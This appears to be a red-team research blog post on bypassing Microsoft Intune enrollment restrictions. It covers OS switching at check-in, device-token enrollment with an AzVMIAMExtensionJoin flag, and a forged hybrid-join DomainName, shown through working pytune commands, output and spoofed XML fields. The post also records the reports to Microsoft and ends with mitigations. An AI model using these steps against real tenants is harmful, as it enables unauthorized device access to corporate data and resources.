---
title: "Bypassing Enrollment Restrictions to Break BYOD Barriers in Intune"
excerpt: "Ways of device ownership spoofing and more for persistent access to Intune "
header: 
  overlay_image: "/assets/images/post1/enroll-error.png"
  teaser: "/assets/images/post1/enroll-error.png"
  overlay_filter: 0.5
  show_overlay_excerpt: true
toc: true
classes: wide
categories: Intune
tags: 
  - Entra ID
  - Intune
  - Red Team
---

# Introduction

As device management through Intune is becoming the standard in many organizations, opportunities to conduct attack simulations targeting Intune have been increasing in Red Team operations.

By using tools like [pytune](https://github.com/secureworks/pytune) to register fake devices into the target organization’s tenant, sometimes it is possible to exfiltrate valuable information from Intune such as configuration profiles and powershell scripts or mark devices as compliant, thereby satisfying Conditional Access policies and gaining access to various cloud resources.

However, when enrolling fake devices into Intune, there are cases where the enrollment may fail.

```xml
$ python3 pytune.py -v enroll_intune -o Windows -d Windows_pytune -f .roadtools_auth -c Windows_pytune.pfx      
[*] resolved enrollment url: https://fef.msuc06.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc
[*] enrolling device to Intune...
[*] received response for enrollment request:
<s:Envelope
	xmlns:s="http://www.w3.org/2003/05/soap-envelope"
	xmlns:a="http://www.w3.org/2005/08/addressing">
	<s:Body>
		<s:Fault>
			<s:Code>
				<s:Value>s:Receiver</s:Value>
				<s:Subcode>
					<s:Value>s:Authorization</s:Value>
				</s:Subcode>
			</s:Code>
			<s:Reason>
				<s:Text xml:lang="en-US">Device Identifier not preregistered</s:Text>
			</s:Reason>
			<s:Detail>
				<DeviceEnrollmentServiceError
					xmlns="http://schemas.microsoft.com/windows/pki/2009/01/enrollment">
					<ErrorType>DeviceNotSupported</ErrorType>
					<Message>Device Identifier not preregistered</Message>
					<TraceId>c12da796-484e-4a6f-acf2-db07987023e6</TraceId>
				</DeviceEnrollmentServiceError>
			</s:Detail>
		</s:Fault>
	</s:Body>
</s:Envelope>
[-] device enrollment failed. maybe enrollment restriction?
```

This is caused by **device enrollment restriction** feature based on device ownership, which we will discuss later.

This restriction helps prevent employees from enrolling their personal devices into Intune and accessing corporate resources. Also this restriction sometimes prevents attackers like us from enrolling a fake device and doing bad things.

Since many organizations have this restriction configured, I investigated possible bypass techniques and, as a result, I identified several methods to bypass the restriction.

# Intune enrollment refresher

Before introducing the techniques, let's review how Intune device enrollment works first. If you're already familiar with this, you can skip to the next section.

Device enrollment in Intune can vary depending on the scenario, but in general, it follows these steps. 
(There are some exceptions, which are out of scope for this article)

1. **Entra join/register**
2. **Intune certificate enrollment**
3. **Check-in**

## 1. Entra join/register

Before enrolling a device into Intune, the device must be registered in Entra ID first.
By obtaining an access token for the Device Registration Service, this can be performed as shown below.

```bash
$ roadtx gettokens -u lowuser@***.onmicrosoft.com -p $PASSWORD -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r devicereg
Requesting token for resource urn:ms-drs:enterpriseregistration.windows.net
Tokens were written to .roadtools_auth

$ python3 pytune.py entra_join -o Windows -d Windows_pytune -f .roadtools_auth                                  
Saving private key to Windows_pytune_key.pem
Registering device
Device ID: 7e147568-0985-4df9-bb4e-76d6ecb70d62
Saved device certificate to Windows_pytune_cert.pem
[+] successfully registered Windows_pytune to Entra ID!
[*] here is your device certificate: Windows_pytune.pfx (pw: password)
```

Now we can confirm that a fake Windows device has been successfully joined and its device object is created in Entra ID as shown below.

![alt text](/assets/images/post1/device-register.png)

Once the device is enrolled in Entra ID, it receives device certificates that can be used to retrieve various tokens such as a user's access token containing `deviceid` claim, which is used later in the process. 

## 2. Intune certificate enrollment

After the Entra join/register, now the device can be enrolled to Intune. 

```bash
$ python3 pytune.py enroll_intune -o Windows -d Windows_pytune -f .roadtools_auth -c Windows_pytune.pfx 
[*] resolved enrollment url: https://fef.msuc06.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc
[*] enrolling device to Intune...
[+] successfully enrolled Windows_pytune to Intune!
[*] here is your MDM pfx: Windows_pytune_mdm.pfx (pw: password)
```

In this step, A XML-based request like the one below is sent to Intune.

![alt text](/assets/images/post1/intune-certificate-enroll.png)

This request includes a Certificate Signing Request (CSR) and Intune sends back its signed device certificate. With this certificate, the device can communicate with the Intune MDM server in a later step.

In addition, this request contains a user's access token with the `deviceid` claim, allowing the device object in Entra ID to be linked to the one created in Intune.

## 3. Check-in

Once the device obtains the Intune device certificate, the device start communicating with the Intune MDM server. 

This communication is called **check-in** and the protocol is based on OMA-DM (Open Mobile Alliance Device Management) protocol. Device configurations are retrieved and status updates are reported through the exchange of XML-based messages (SyncML).

This can be done using pytune as shown below.

```bash
$ python3 pytune.py checkin -c Windows_pytune.pfx -m Windows_pytune_mdm.pfx -o Windows -f .roadtools_auth -d Windows_pytune
[*] send request #1
 [*] sending data for ./Vendor/MSFT/NodeCache/MS%20DM%20Server
 [*] sending data for ./Vendor/MSFT/NodeCache/MS%20DM%20Server/CacheVersion
 [*] sending data for ./Vendor/MSFT/NodeCache/MS%20DM%20Server/ChangedNodes
 [*] sending data for ./DevDetail/SwV
[*] send request #2
 [*] sending data for ./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/EntDMID
 [*] sending data for ./DevDetail/Ext/Microsoft/DeviceName
 [*] sending data for ./DevInfo/Man
 [*] sending data for ./DevInfo/Mod
 [*] sending data for ./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/ExchangeID
...
```

After the check-in, Intune synchronizes the received device information, such as compliance status, with Entra ID.

![alt text](/assets/images/post1/after-checkin.png)

Now that we've reviewed the device enrollment process in Intune, let's take a look at the restrictions related to the device enrollment.

# Device enrollment restriction

There are two types of restrictions available in Intune. One is **device limit restrictions** where you can restrict the number of devices a user can enroll in Intune.

The other one is **device platform restrictions** which allow us to restrict device enrollment on the following criteria: 

- Device platform
- OS version
- Device manufacturer
- Device ownership

By default, the following rule is applied to all users in the tenant and no restrictions are configured for the device platform restrictions.

![alt text](/assets/images/post1/default-device-platform-restriction.png)

In this article, we focus on the **Device ownership** restriction, as we frequently encounter this during engagements.

## Block personally owned devices

In Intune, you can configure this in Microsoft Intune admin center under Devices > Device onboarding > Enrollment > Device platform restriction.

![alt text](/assets/images/post1/configure-block-restriction.png)

Once this restriction is configured, corporate-owned devices are only allowed and the certificate enrollment request is blocked. Below is an example of Intune enrollment via pytune being prevented.

```bash
$ python3 pytune.py enroll_intune -o Windows -d Windows_pytune -f .roadtools_auth -c Windows_pytune.pfx      
[*] resolved enrollment url: https://fef.msuc06.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc
[*] enrolling device to Intune...
[-] device enrollment failed. maybe enrollment restriction?
```

Or, when trying to enroll a real Windows machine, you encounter an error like this (error code 80180014).

![alt text](/assets/images/post1/enroll-error.png)

Then, what types of devices are actually allowed in this case? 

Well, as for Windows, the following enrollment methods are authorized for corporate enrollment:

> - The device enrolls through Windows Autopilot.
> - The device enrolls through GPO, or automatic enrollment from Configuration Manager for co-management.
> - The device enrolls through a bulk provisioning package.
> - The enrolling user is using a device enrollment manager account.
> 
> *[https://learn.microsoft.com/en-us/intune/intune-service/enrollment/enrollment-restrictions-set#blocking-personal-windows-devices](https://learn.microsoft.com/en-us/intune/intune-service/enrollment/enrollment-restrictions-set#blocking-personal-windows-devices)*

Based on this explanation, it seems difficult for an external attacker who has merely stolen a standard user’s credentials or token to enroll their own device in Intune as a corporate-owned device.

However, there are several ways to get around this restriction.

# How to bypass Intune device platform enrollment restriction

## Method 1: Check-in as different OS

Let’s say the following device platform restrictions are configured in the target tenant:

- **Android**: Personally owned devices are **allowed**
- **Windows**: Personally owned devices are **blocked**

This is a common scenario where BYOD is allowed for mobile devices, while Windows devices are provided and managed by the organization.

With this configuration, Android device enrollment will succeed as shown below.

```zsh
$ python3 pytune.py entra_join -o Android -d Android_pytune -f .roadtools_auth                          
Saving private key to Android_pytune_key.pem
Registering device
Device ID: da27cd8a-7ed8-4478-99ac-75aaa870d10a
Saved device certificate to Android_pytune_cert.pem
[+] successfully registered Android_pytune to Entra ID!
[*] here is your device certificate: Android_pytune.pfx (pw: password)

$ python3 pytune.py enroll_intune -o Android -f .roadtools_auth -c Android_pytune.pfx -d Android_pytune
[*] resolved enrollment url: https://fef.msuc06.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc
[*] enrolling device to Intune...
[+] successfully enrolled Android_pytune to Intune!
[*] here is your MDM pfx: Android_pytune_mdm.pfx (pw: password)
```

The fake device was enrolled as an Android device because the `-o Android` option was specified.

![alt text](/assets/images/post1/android-registered.png)

Then, we run `checkin` command with the `-o Windows` option. When the command is executed with Windows specified as its OS, pytune submits the information of the fake device to Intune as if it were a Windows device like OS versions or device configurations.

```zsh
$ python3 pytune.py checkin -c Android_pytune.pfx -m Android_pytune_mdm.pfx -d Android_pytune -o Windows -f .roadtools_auth
[*] send request #1
 [*] sending data for ./Vendor/MSFT/NodeCache/MS%20DM%20Server
 [*] sending data for ./Vendor/MSFT/NodeCache/MS%20DM%20Server/CacheVersion
 [*] sending data for ./Vendor/MSFT/NodeCache/MS%20DM%20Server/ChangedNodes
 [*] sending data for ./DevDetail/SwV
 [*] sending data for ./DevDetail/Ext/Microsoft/LocalTime
 [*] sending data for ./Vendor/MSFT/WindowsLicensing/Edition
 [*] sending data for ./Vendor/MSFT/Update/LastSuccessfulScanTime
 [*] sending data for ./Vendor/MSFT/DeviceStatus/OS/Mode
[*] send request #2
 [*] sending data for ./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/EntDMID
 [*] sending data for ./DevDetail/Ext/Microsoft/DeviceName
 [*] sending data for ./DevInfo/Man
 [*] sending data for ./DevInfo/Mod
 [*] sending data for ./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/ExchangeID
 [*] sending data for ./Device/Vendor/MSFT/DeviceManageability/Capabilities/CSPVersions
 [*] sending data for ./DevDetail/Ext/Microsoft/ProcessorArchitecture
 [*] sending data for ./Vendor/MSFT/DeviceStatus/OS/Edition
 [*] sending data for ./DevDetail/Ext/Microsoft/OSPlatform
...
```

You might expect Intune to reject the check-in if an Android device suddenly claims to be a different OS. Surprisingly, that’s not what happens.

After the check-in, Intune synchronizes the device information with Entra ID, and we can now see that the device is registered as a Windows device.

![alt text](/assets/images/post1/android-register-again.png)

I couldn't believe this but this was what happened.

![alt text](/assets/images/post1/not-android.jpg)

Since we were able to change the device platform via the check-in, the fake device can act as a Windows machine and it can download Windows scripts available in Intune.

```zsh
$ python3 pytune.py download_apps -m Android_pytune_mdm.pfx -d Android_pytune
[*] downloading scripts...
[!] scripts found!
[*] #1 (policyid:4cb9909f-5e2a-4bc6-9771-6b22de1805ee):

Write-host "hello world"
```

This was discovered thanks to [Chirag Savla](https://x.com/chiragsavla94). So, we reported this issue to Microsoft.

However, Microsoft was like "*Yeah, but you can do this only when other platforms have no such restrictions, right?*" and decided it’s not something that needs to be fixed. 

> Upon investigation, we have determined that this is not considered a security vulnerability because to achieve the functionality described a user must first enroll a non blocked device, such as an Android mobile, and then check in as a Windows device, which bypasses the enrollment restriction. 

I thought Microsoft was basically saying “Try Harder” so I accepted the challenge and started looking for other ways to bypass the restrictions which could work even when only corporate devices are allowed on any OSs.

![alt text](/assets/images/post1/find-more-bypass.jpg)

## Method 2: Intune enrollment via device token

I was looking at Microsoft's documentation about enrollment restrictions and found there are some limitations in this feature as described below.

> ![alt text](/assets/images/post1/enrollment-restriction-limitation.png)
> *[https://learn.microsoft.com/en-us/intune/intune-service/enrollment/enrollment-restrictions-set#limitations](https://learn.microsoft.com/en-us/intune/intune-service/enrollment/enrollment-restrictions-set#limitations)*

This means only **user-driven** enrollments are influenced by the device enrollment restrictions and, if we can implement the non user-driven enrollments, we can bypass the restrictions.

I didn't know exactly what is and what isn't **user-driven**. So, I decided to dig into one of the examples mentioned above, **Azure Virtual Desktop** (**AVD**).

To try this out, I created an AVD machine with the following options enabled.

![alt text](/assets/images/post1/avd-options.png)

Once the AVD was deployed, it was automatically enrolled in both Entra ID and Intune.

![alt text](/assets/images/post1/avd-enrolled.png)

I connected to the AVD via RDP and came across an interesting log file at `C:\WindowsAzure\Logs\Plugins\Microsoft.Azure.ActiveDirectory.AADLoginForWindows\2.2.0.0`.

```
2025-07-19T02:45:56.9089976Z	[Information]:	Running AAD Join Process
2025-07-19T02:45:56.9089976Z	[Information]:	Starting Dsregcmd with arguments  /AzureSecureVMJoin /debug /MdmId 0000000a-0000-0000-c000-000000000000
...
2025-07-19T02:46:12.6121377Z	[Information]:	Joining device to Azure AD with MSI credential.
2025-07-19T02:46:12.6121377Z	[Information]:	Getting Azure VM metadata.
...
2025-07-19T02:46:12.6121377Z	[Information]:	Getting MSI token for app urn:ms-drs:enterpriseregistration.windows.net.
2025-07-19T02:46:12.6121377Z	[Information]:	Targeting host name:169.254.169.254, url path: /metadata/identity/oauth2/token?resource=urn:ms-drs:enterpriseregistration.windows.net&api-version=2018-02-01
2025-07-19T02:46:12.6277563Z	[Information]:	DsrCmdAzureHelper::GetMetadataRestResponse: HTTP Status Code: 200
2025-07-19T02:46:12.6277563Z	[Information]:	dwDownloaded:1833, dwCombinedSize:1833
2025-07-19T02:46:12.6277563Z	[Information]:	dwDownloaded:0, dwCombinedSize:1833
2025-07-19T02:46:12.6277563Z	[Information]:	Received Content (size 1833):
2025-07-19T02:46:12.6277563Z	[Information]:	{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Il9qTndqZVNudlRUSzh ... 
2025-07-19T02:46:12.6277563Z	[Information]:	Starting join process with MSI credential.
2025-07-19T02:46:12.6277563Z	[Information]:	Join request ID: 7333f304-2d73-4c4d-9321-9427ee97adcf
...
2025-07-19T02:46:12.6277563Z	[Information]:	Starting MDM URLs discovery (MDM app ID is: 0000000a-0000-0000-c000-000000000000).
2025-07-19T02:46:12.6277563Z	[Information]:	MDM Enrollment URL: https://enrollment.manage.microsoft.com/enrollmentserver/discovery.svc
2025-07-19T02:46:12.6277563Z	[Information]:	MDM resource ID: https://enrollment.manage.microsoft.com/
2025-07-19T02:46:12.6277563Z	[Information]:	Access token for MDM enrollment acquired successfully.
2025-07-19T02:46:12.6277563Z	[Information]:	Starting MDM enrollment...
2025-07-19T02:46:12.6277563Z	[Information]:	MDM enrollment succeeded.
```

Based on this log, we can see that:

- `dsregcmd.exe` was executed with arguments like `/AzureSecureVMJoin` to start the enrollment process
- The AVD was then joined to Entra ID using **MSI** credential, which is basically an access token of **Managed Service Identity** associated with the device
- Finally, a token for MDM enrollment service was acquired and used to enroll the device to Intune

From this observation, I initially assumed that the token of its managed identity was being used for Intune enrollment and that it enables the non **user-driven** enrollment. However, this was not the case.

Analyzing the network traffic during the enrollment revealed that AVD actually uses **device token** for Intune enrollment. I guess this was the key for non **user-driven** enrollment, while the enrollment tends to use a user's access token.

In fact, Entra ID devices can acquire tokens on their own using its device certificate, and this behavior is already implemented in [roadtools](https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/asyncdeviceauth.py#L536).

In case anyone interested, here is what the device's access token looks like. As you can see, `idtyp` is device, not user.

```json
{
  "aud": "https://enrollment.manage.microsoft.com/",
  "iss": "https://sts.windows.net/********-c65b-4310-a3a3-c9688f331cd3/",
  "iat": 1753181608,
  "nbf": 1753181608,
  "exp": 1753185508,
  "amr": [
    "rsa"
  ],
  "deviceid": "dd9f3b0f-bc61-4085-b527-3469561da756",
  "idp": "https://sts.windows.net/********-c65b-4310-a3a3-c9688f331cd3/",
  "idtyp": "device",
  "ipaddr": "*.*.*.*",
  "oid": "19efeb42-90cf-46d0-807c-ec75c252208b",
  "rh": "1.AWsAB6GE1FvGEEOjo8lojzMc01XO69RaAbVJoIPITReXroxrAABrAA.",
  "sub": "dd9f3b0f-bc61-4085-b527-3469561da756",
  "tid": "********-c65b-4310-a3a3-c9688f331cd3",
  "uti": "Ia05B_64WUOCl87Pk4o_AA",
  "ver": "1.0",
  "xms_dch": "kIkUGIE04O6V8JcTtJCo/S0pX8LOv2oAIFfhmzBgX8s=",
  "xms_drt": 1753181908,
  "xms_ftd": "0H9vm9kFiUR9Rb7_L_p6FO7Wdlp2Ik6X9cdNfnm12QIBamFwYW53ZXN0LWRzbXM",
  "xms_idrel": "9 22",
  "xms_rid": "/subscriptions/95074c2b-aecd-4f02-8238-4a4ec989610b/resourceGroups/test/providers/Microsoft.Compute/virtualMachines/testavd01-0"
}
```

So, I tried sending an Intune certificate enrollment request with a fake device's token based on this approach. However, it failed with the following error response:

```xml
<s:Envelope
	xmlns:s="http://www.w3.org/2003/05/soap-envelope"
	xmlns:a="http://www.w3.org/2005/08/addressing">
	<s:Body>
		<s:Fault>
			<s:Code>
				<s:Value>s:Receiver</s:Value>
				<s:Subcode>
					<s:Value>s:MessageFormat</s:Value>
				</s:Subcode>
			</s:Code>
			<s:Reason>
				<s:Text xml:lang="en-US">Device based token is not supported for enrollment type UserCorporateWithAAD</s:Text>
			</s:Reason>
			<s:Detail>
				<DeviceEnrollmentServiceError
					xmlns="http://schemas.microsoft.com/windows/pki/2009/01/enrollment">
					<ErrorType>MessageFormat</ErrorType>
					<Message>Device based token is not supported for enrollment type UserCorporateWithAAD</Message>
					<TraceId>03875147-02e0-4d8f-beef-42dd144e0d4d</TraceId>
				</DeviceEnrollmentServiceError>
			</s:Detail>
		</s:Fault>
	</s:Body>
</s:Envelope>
```

From the error message "*Device based token is not supported for enrollment type UserCorporateWithAAD*", I suspected that the enrollment type specified somewhere in the request doesn’t align with the use of the device token.

So, I intercepted the request sent during the enrollment process and compared it with mine. As a result, I found that a specific XML data was important when using a device token.

```xml
<ac:ContextItem Name="AzVMIAMExtensionJoin">
    <ac:Value>true</ac:Value>
</ac:ContextItem>
```

When the `AzVMIAMExtensionJoin` value is set to `true`, Intune treats the enrolling device as an Azure virtual machine (like AVD) and accepts the enrollment request using its device token.

I implemented this behavior in pytune (`--device_token` option) and successfully enrolled a fake Windows device into Intune, bypassing the enrollment restrictions.

```zsh
$ python3 pytune.py enroll_intune -o Windows -d Windows_pytune -f .roadtools_auth -c Windows_pytune.pfx --device_token   
[*] resolved enrollment url: https://fef.msuc06.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc
[*] uses device token for Intune enrollment
[*] enrolling device to Intune...
[+] successfully enrolled Windows_pytune to Intune!
[*] here is your MDM pfx: Windows_pytune_mdm.pfx (pw: password)
```

The attack steps are as follows:

1. Steal valid credentials or a token for the device registration service
2. Register a fake device with Entra ID and obtain device certificate
3. Acquire its device's token with the certificate
4. Submit an Intune enrollment request using the device token

There’s no need to deploy an AVD or create a specific type of device in the target tenant. We can simply Entra-join a fake device and use its device token for Intune enrollment because Intune doesn’t actually verify whether the usage of the device token is against the legitimate scenario.

I felt something wrong with this and reported this issue to Microsoft. But, this issue was not fixed as well.

> Although your report included some good information, it does not meet Microsoft’s requirement as a security vulnerability for servicing. 

As Microsoft states, "*Enrollment restrictions are applied to enrollments that are user-driven*" which means userless enrollment like the one I used can bypass those restrictions.

At first, I was satisfied with this method. But eventually, I started looking for another bypass because I felt this approach was just like bypassing EDR on a system where EDR isn’t even installed.

## Method 3: Forging corporate device

As mentioned earlier, the following devices are treated as corporate-owned. My next approach for a bypass was to spoof one of these device types.

> - The device enrolls through Windows Autopilot.
> - The device enrolls through GPO, or automatic enrollment from Configuration Manager for co-management.
> - The device enrolls through a bulk provisioning package.
> - The enrolling user is using a device enrollment manager account.
> 
> *[https://learn.microsoft.com/en-us/intune/intune-service/enrollment/enrollment-restrictions-set#blocking-personal-windows-devices](https://learn.microsoft.com/en-us/intune/intune-service/enrollment/enrollment-restrictions-set#blocking-personal-windows-devices)*

After looking into them, I found that the Intune enrollment scenario using GPO was particularly interesting.

The GPO scenario can be used to trigger automatic enrollment to Intune for AD domain-joined devices.

You can create the group policy under Computer Configuration > Administrative Templates > Windows Components > MDM > Enable automatic MDM enrollment using default Azure AD credentials.

![alt text](/assets/images/post1/intune-gpo.png)

On a Entra hybrid joined device, I enabled this Group Policy and analyzed the network traffic during Intune enrollment.

Analyzing its enrollment request revealed the following:

- The access token included in the enrollment request is the token of the user logging into the device, not device token.
- The access token has `deviceid` associated with the device registered as Entra hybrid joined in Entra ID
- The enrollment request contained the following XML data, indicating the AD domain the device belongs to.

```xml
<ac:ContextItem Name="DomainName">
	<ac:Value>contoso.local</ac:Value>
</ac:ContextItem>
```

The enrollment request enrolled the device in Intune as a corporate-owned device. So, I decided to replicate the enrollment request to see if we can spoof the device ownership. 

In my attempt, I tried enrolling a fake device that is only Entra joined and I included a random domain name like "evil.local" in the `DomainName` field of the XML data.

I assumed the request would be rejected since the device wasn’t Entra hybrid joined and the domain name didn’t even exist.

But, my assumption wasn't right again. Here is the result of `enroll_intune` command with `--hybrid` option for this scenario:

```zsh
$ python3 pytune.py enroll_intune -o Windows -d Windows_pytune -f .roadtools_auth -c Windows_pytune.pfx --hybrid
[*] resolved enrollment url: https://fef.msuc06.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc
[*] enrolling device to Intune...
[+] successfully enrolled Windows_pytune to Intune!
[*] here is your MDM pfx: Windows_pytune_mdm.pfx (pw: password)
```

![alt text](/assets/images/post1/enrolled-fake-device.png)

So, I was able to enroll the fake device to Intune, impersonating a Entra hybrid joined device.

![alt text](/assets/images/post1/meme-entra-hybrid.jpg)

I thought Intune should verify whether the device in the enrollment request is actually Entra Hybrid joined, so I reported this to Microsoft. But they didn’t think it was critical enough to fix.

> Thank you for responsibly reporting this issue. After review, we determined the reported issue is not a vulnerability because enrolment restrictions rely on device attributes

# Conclusion

That's all for the bypasses. Actually, there is more but I got tired of writing a blog so maybe I'll cover the rest next time.

During the research, I saw Microsoft describing enrollment restrictions as a "best-effort barrier" and now I get why they said that.

> Enrollment restrictions are not security features. Compromised devices can misrepresent their character. These restrictions are a best-effort barrier for non-malicious users.
> 
> [https://learn.microsoft.com/en-us/intune/intune-service/enrollment/enrollment-restrictions-set](https://learn.microsoft.com/en-us/intune/intune-service/enrollment/enrollment-restrictions-set)

If you're expecting enrollment restrictions to prevent unauthorized device from accessing corporate data as a security measure, you might be relying on them too much. It's strongly recommended to implement additional layers of defense. The examples are:

- Require multifactor authentication for device registration in a Conditional Acccess policy ([link](https://learn.microsoft.com/en-us/entra/identity/conditional-access/policy-all-users-device-registration))
- Block device code flow ([link](https://learn.microsoft.com/en-us/entra/identity/conditional-access/policy-block-authentication-flows#device-code-flow-policies))

Also, the latest version of pytune has all the features implemented for this research. Enjoy.

# Reference

- [https://learn.microsoft.com/en-us/intune/intune-service/enrollment/enrollment-restrictions-set](https://learn.microsoft.com/en-us/intune/intune-service/enrollment/enrollment-restrictions-set)
- [https://github.com/dirkjanm/ROADtools/tree/master](https://github.com/dirkjanm/ROADtools/tree/master)